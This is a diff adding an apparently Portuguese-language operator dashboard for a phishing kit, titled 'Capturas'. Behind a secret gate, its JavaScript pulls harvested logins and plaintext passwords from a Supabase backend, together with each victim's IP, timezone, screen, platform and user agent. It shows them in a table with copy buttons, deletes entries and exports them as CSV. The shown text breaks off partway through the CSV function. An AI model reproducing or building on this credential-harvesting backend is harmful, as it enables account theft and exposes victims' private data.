@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Painel · Capturas</title>
+<style>
+  *{box-sizing:border-box}
+  body{
+    margin:0;background:#0e1116;color:#e6e9ef;min-height:100vh;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  }
+  header{
+    display:flex;align-items:center;gap:12px;flex-wrap:wrap;
+    padding:16px 22px;border-bottom:1px solid #1e242e;position:sticky;top:0;
+    background:#0e1116;z-index:5;
+  }
+  h1{font-size:16px;margin:0;font-weight:600;letter-spacing:-.2px}
+  .count{
+    font-size:12px;background:#1a222d;color:#8fa3bd;padding:3px 9px;border-radius:99px;
+  }
+  .spacer{flex:1}
+  input[type=search],input[type=password]{
+    background:#151b24;border:1px solid #263040;color:#e6e9ef;
+    border-radius:8px;padding:8px 11px;font-size:13px;outline:none;font-family:inherit;
+  }
+  input[type=search]{width:220px}
+  input[type=search]:focus,input[type=password]:focus{border-color:#3a4a61}
+  button{
+    background:#151b24;border:1px solid #263040;color:#c9d4e3;
+    border-radius:8px;padding:8px 12px;font-size:13px;cursor:pointer;font-family:inherit;
+  }
+  button:hover{border-color:#3a4a61;color:#fff}
+  button.primary{background:#0095f6;border-color:#0095f6;color:#fff;font-weight:600}
+  button.primary:hover{filter:brightness(1.1)}
+  .gate{
+    max-width:360px;margin:16vh auto;padding:28px;background:#141a23;
+    border:1px solid #232c39;border-radius:14px;
+  }
+  .gate h2{margin:0 0 6px;font-size:17px}
+  .gate p{margin:0 0 18px;font-size:13px;color:#8fa3bd}
+  .gate input{width:100%;margin-bottom:10px}
+  .gate button{width:100%}
+  .gate .err{color:#ff7b7b;font-size:12px;margin-top:10px;min-height:14px}
+  main{padding:18px 22px 60px}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th{
+    text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.6px;
+    color:#7d8da3;font-weight:600;padding:8px 10px;border-bottom:1px solid #1e242e;
+    white-space:nowrap;
+  }
+  td{padding:10px;border-bottom:1px solid #171d26;vertical-align:top}
+  tbody tr:hover{background:#131922}
+  .id{font-weight:600;color:#fff;word-break:break-all}
+  .pw{display:flex;align-items:center;gap:8px}
+  .pw code{
+    background:#1a222d;padding:3px 7px;border-radius:6px;font-size:12px;
+    color:#8ff0b5;word-break:break-all;
+  }
+  .pw button{padding:2px 7px;font-size:11px}
+  .meta{color:#7d8da3;font-size:11px;line-height:1.5;max-width:280px}
+  .when{color:#9fb0c6;white-space:nowrap;font-size:12px}
+  .empty{color:#7d8da3;padding:40px 0;text-align:center;font-size:14px}
+  .hide{display:none}
+</style>
+</head>
+<body>
+
+<div id="gate" class="gate">
+  <h2>Painel de capturas</h2>
+  <p>Digite o segredo para liberar o acesso.</p>
+  <input id="secret" type="password" placeholder="Segredo" autocomplete="off">
+  <button class="primary" id="go">Entrar</button>
+  <div class="err" id="err"></div>
+</div>
+
+<div id="app" class="hide">
+  <header>
+    <h1>Capturas</h1>
+    <span class="count" id="count">0</span>
+    <div class="spacer"></div>
+    <input id="q" type="search" placeholder="Filtrar...">
+    <button id="csv">CSV</button>
+    <button id="reload">Atualizar</button>
+  </header>
+  <main>
+    <table>
+      <thead>
+        <tr>
+          <th>Login</th><th>Senha</th><th>Quando</th><th>Origem</th><th></th>
+        </tr>
+      </thead>
+      <tbody id="rows"></tbody>
+    </table>
+    <div class="empty hide" id="empty">Nada por aqui ainda.</div>
+  </main>
+</div>
+
+<script>
+/* ====== CONFIG (iguais aos do index.html) ====== */
+const SUPABASE_URL  = "https://SEU-PROJETO.supabase.co";
+const SUPABASE_ANON = "SUA_CHAVE_ANON";
+/* ============================================== */
+
+const gate = document.getElementById('gate');
+const app  = document.getElementById('app');
+const rows = document.getElementById('rows');
+const empty = document.getElementById('empty');
+const count = document.getElementById('count');
+const q = document.getElementById('q');
+let secret = '';
+let data = [];
+
+function br(ts){
+  const d = new Date(ts);
+  return d.toLocaleString('pt-BR', { day:'2-digit', month:'2-digit', year:'2-digit',
+    hour:'2-digit', minute:'2-digit' });
+}
+
+function render(){
+  const term = q.value.trim().toLowerCase();
+  const list = data.filter(r =>
+    !term || (r.identity || '').toLowerCase().includes(term) ||
+    (r.password || '').toLowerCase().includes(term) ||
+    (r.ip || '').toLowerCase().includes(term));
+
+  count.textContent = data.length;
+  rows.innerHTML = '';
+  empty.classList.toggle('hide', list.length > 0);
+
+  for (const r of list) {
+    const tr = document.createElement('tr');
+
+    const tdId = document.createElement('td');
+    const idv = document.createElement('div');
+    idv.className = 'id';
+    idv.textContent = r.identity || '—';
+    tdId.appendChild(idv);
+
+    const tdPw = document.createElement('td');
+    const pw = document.createElement('div');
+    pw.className = 'pw';
+    const code = document.createElement('code');
+    code.textContent = r.password || '—';
+    const copy = document.createElement('button');
+    copy.textContent = 'copiar';
+    copy.onclick = () => navigator.clipboard.writeText(r.password || '');
+    pw.append(code, copy);
+    tdPw.appendChild(pw);
+
+    const tdWhen = document.createElement('td');
+    tdWhen.className = 'when';
+    tdWhen.textContent = br(r.created_at);
+
+    const tdMeta = document.createElement('td');
+    const meta = document.createElement('div');
+    meta.className = 'meta';
+    meta.innerHTML = [r.ip, r.screen, r.timezone, r.language, r.platform]
+      .filter(Boolean).map(v => v.replace(/</g,'&lt;')).join(' · ');
+    const ua = document.createElement('div');
+    ua.style.cssText = 'opacity:.55;margin-top:4px';
+    ua.textContent = (r.user_agent || '').slice(0, 90);
+    tdMeta.append(meta, ua);
+
+    const tdAct = document.createElement('td');
+    const del = document.createElement('button');
+    del.textContent = 'apagar';
+    del.onclick = () => remove(r.id);
+    tdAct.appendChild(del);
+
+    tr.append(tdId, tdPw, tdWhen, tdMeta, tdAct);
+    rows.appendChild(tr);
+  }
+}
+
+async function load(){
+  const res = await fetch(SUPABASE_URL + '/rest/v1/rpc/get_logins', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'apikey': SUPABASE_ANON,
+      'Authorization': 'Bearer ' + SUPABASE_ANON
+    },
+    body: JSON.stringify({ p_secret: secret })
+  });
+  if (!res.ok) throw new Error('falhou');
+  data = await res.json();
+  render();
+}
+
+async function remove(id){
+  await fetch(SUPABASE_URL + '/rest/v1/rpc/del_login', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'apikey': SUPABASE_ANON,
+      'Authorization': 'Bearer ' + SUPABASE_ANON
+    },
+    body: JSON.stringify({ p_secret: secret, p_id: id })
+  });
+  load();
+}
+
+document.getElementById('go').onclick = async () => {
+  secret = document.getElementById('secret').value;
+  if (!secret) return;
+  try {
+    await load();
+    gate.classList.add('hide');
+    app.classList.remove('hide');
+    sessionStorage.setItem('sec', secret);
+    setInterval(load, 20000);
+  } catch {
+    document.getElementById('err').textContent = 'Segredo inválido ou banco sem resposta.';
+  }
+};
+
+document.getElementById('secret').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('go').click();
+});
+document.getElementById('reload').onclick = load;
+q.addEventListener('input', render);
+
+document.getElementById('csv').onclick = () => {
+  const head = 'identity,password,created_at,ip,timezone,screen,language,platform,user_agent\n';
+  const body = data.map(r => [
+    r.identity, r.password, r.created_at, r.ip, r.timezone, r.screen,
+    r.language, r.platform, r.user_agent
+  ].map(v => '"' + String(v ?? '').replace(/"/g, '""') + '"').join(',')).join('\n');
+  const url = URL.createObjectURL(new Blob([head + body], { type:'text/csv' }));
+  const a = document.createElement('a');
+  a.href = url; a.download = 'capturas.csv'; a.click();
